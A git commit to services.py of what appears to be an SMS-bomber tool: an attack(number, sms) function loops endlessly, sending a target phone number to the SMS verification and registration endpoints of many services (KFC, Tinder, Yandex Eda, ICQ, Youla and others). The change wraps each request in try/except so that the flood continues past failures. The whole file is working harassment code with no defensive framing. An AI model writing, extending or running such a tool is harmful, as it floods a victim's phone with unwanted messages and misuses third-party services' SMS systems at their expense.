f153b708760b29eab0e80e00c258b9ae88f972ff
Nikait <50284221+Nikait@users.noreply.github.com>
2020-03-14 17:39:41 +0300

    Update services.py

--- services.py
+++ services.py
@@ -40,117 +40,130 @@ def attack(number, sms):
     print('|  ' + color.Green + color.BOLD + "  amount   " + color.END + ' | ' + color.Green + color.BOLD + "     time     " + color.END + " |")
     print("-" * 33)
     while True:
-        requests.post("https://api.wowworks.ru/v2/site/send-code",json={"phone": number_7, "type": 2})
-
-        sent += 1
-        time(sent)
-        check(sent,sms)
-
-        requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': number_7})
-
-        sent += 1
-        time(sent)
-        check(sent,sms)
-
-        requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code",json = {"phone": number_7})
-
-        sent += 1
-        time(sent)
-        check(sent,sms)
-
-        requests.post('https://cloud.mail.ru/api/v2/notify/applink',json = {"phone": number_plus7, "api": 2, "email": "email","x-email": "x-email"})
-
-        sent += 1
-        time(sent)
-        check(sent,sms)
-
-        requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': number_plus7})
-
-        sent += 1
-        time(sent)
-        check(sent,sms)
-
-        utair = requests.post('https://b.utair.ru/api/v1/login/', data = {'login':number_8}, headers = {})
-
-        sent += 1
-        time(sent)
-        check(sent,sms)
-
-        tinder = requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data = {"phone_number":number_7}, headers = {})
-
-        sent += 1
-        time(sent)
-        check(sent,sms)
-
-        citilink = requests.post('https://www.citilink.ru/registration/confirm/phone/+'+ number_7 +'/')
-
-        sent += 1
-        time(sent)
-        check(sent,sms)
-
-        requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone", data = {"st.r.phone": number_plus7})
-
-        sent += 1
-        time(sent)
-        check(sent, sms)
-
-        karusel = requests.post('https://app.karusel.ru/api/v1/phone/', data = {"phone":number_7}, headers = {})
-
-        sent += 1
-        time(sent)
-        check(sent, sms)
-
-        youdrive = requests.post('https://youdrive.today/login/web/phone', data = {'phone': number, 'phone_code': '7'}, headers = {})
-
-        sent += 1
-        time(sent)
-        check(sent, sms)
-
-        sunlight = requests.post('https://api.sunlight.net/v3/customers/authorization/', json = {"phone":number_7}, headers = {})
-
-        sent += 1
-        time(sent)
-        check(sent, sms)
-
-        mts = requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': number_7}, headers={})
-
-        sent += 1
-        time(sent)
-        check(sent, sms)
-
-        youla = requests.post('https://youla.ru/web-api/auth/request_code', json = {"phone":number_plus7}, headers = {})
-
-        sent += 1
-        time(sent)
-        check(sent, sms)
-
-
-        eda = requests.post('https://eda.yandex/api/v1/user/request_authentication_code',json={"phone_number": "+" + number_7})
-
-        sent += 1
-        time(sent)
-        check(sent, sms)
-
-        ivi = requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6", data= {"phone": number_7})
-
-        sent += 1
-        time(sent)
-        check(sent, sms)
-
-        delimobile = requests.post("https://api.delitime.ru/api/v2/signup",data={"SignupForm[username]": number_7, "SignupForm[device_type]": 3})
-
-        sent += 1
-        time(sent)
-        check(sent, sms)
-
-        icq = requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',data={'msisdn': number_7, "locale": 'en', 'countryCode': 'ru','version': '1', "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
-
-        sent += 1
-        time(sent)
-        check(sent, sms)
-
-        twitch = requests.post('https://passport.twitch.tv/register?trusted_request=true',json={"birthday": {"day": 11, "month": 11, "year": 1999},"client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True,"password": "password1", "phone_number": number_7,"username": "username2"})
-
-        sent += 1
-        time(sent)
-        check(sent, sms)
+    	try:
+    		requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': number_7})
+    		sent += 1
+    		time(sent)
+    		check(sent,sms)
+    	except:
+    		pass
+    		
+    	try:
+    		requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code",json = {"phone": number_7})
+    		sent += 1
+    		time(sent)
+    		check(sent,sms)
+    	except:
+    		pass
+    		
+    	try:
+    		requests.post('https://cloud.mail.ru/api/v2/notify/applink',json = {"phone": number_plus7, "api": 2, "email": "email","x-email": "x-email"})
+    		sent += 1
+    		time(sent)
+    		check(sent,sms)
+    	except:
+    		pass
+    		
+    	try:
+    		requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': number_plus7})
+    		sent += 1
+    		time(sent)
+    		check(sent,sms)
+    	except:
+    		pass
+    		
+    	try:
+    		utair = requests.post('https://b.utair.ru/api/v1/login/', data = {'login':number_8}, headers = {})
+    		sent += 1
+    		time(sent)
+    		check(sent,sms)
+    	except:
+    		pass
+    		
+    	try:
+    		tinder = requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data = {"phone_number":number_7}, headers = {})
+    		sent += 1
+    		time(sent)
+    		check(sent,sms)
+    	except:
+    		pass
+    		
+    	try:
+    		citilink = requests.post('https://www.citilink.ru/registration/confirm/phone/+'+ number_7 +'/')
+    		sent += 1
+    		time(sent)
+    		check(sent,sms)
+    	except:
+    		pass
+    		
+    	try:
+    		ok = requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone", data = {"st.r.phone": number_plus7})
+    		sent += 1
+    		time(sent)
+    		check(sent,sms)
+    	except:
+    		pass
+    		
+    	try:
+    		karusel = requests.post('https://app.karusel.ru/api/v1/phone/', data = {"phone":number_7}, headers = {})
+    		sent += 1
+    		time(sent)
+    		check(sent,sms)
+    	except:
+    		pass
+    		
+    	try:
+    		youdrive = requests.post('https://youdrive.today/login/web/phone', data = {'phone': number, 'phone_code': '7'}, headers = {})
+    		sent += 1
+    		time(sent)
+    		check(sent,sms)
+    	except:
+    		pass
+    		
+    	try:
+    		mts = requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': number_7}, headers={})
+    		sent += 1
+    		time(sent)
+    		check(sent,sms)
+    	except:
+    		pass
+    		
+    	try:
+    		youla = requests.post('https://youla.ru/web-api/auth/request_code', json = {"phone":number_plus7}, headers = {})
+    		sent += 1
+    		time(sent)
+    		check(sent,sms)
+    	except:
+    		pass
+    		
+    	try:
+    		eda = requests.post('https://eda.yandex/api/v1/user/request_authentication_code',json={"phone_number": "+" + number_7})
+    		sent += 1
+    		time(sent)
+    		check(sent,sms)
+    	except:
+    		pass
+    		
+    	try:
+    		ivi = requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6", data= {"phone": number_7})
+    		sent += 1
+    		time(sent)
+    		check(sent,sms)
+    	except:
+    		pass
+    		
+    	try:
+    		delimobile = requests.post("https://api.delitime.ru/api/v2/signup",data={"SignupForm[username]": number_7, "SignupForm[device_type]": 3})
+    		sent += 1
+    		time(sent)
+    		check(sent,sms)
+    	except:
+    		pass
+    		
+    	try:
+    		icq = requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',data={'msisdn': number_7, "locale": 'en', 'countryCode': 'ru','version': '1', "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
+    		sent += 1
+    		time(sent)
+    		check(sent,sms)
+    	except:
+    		pass
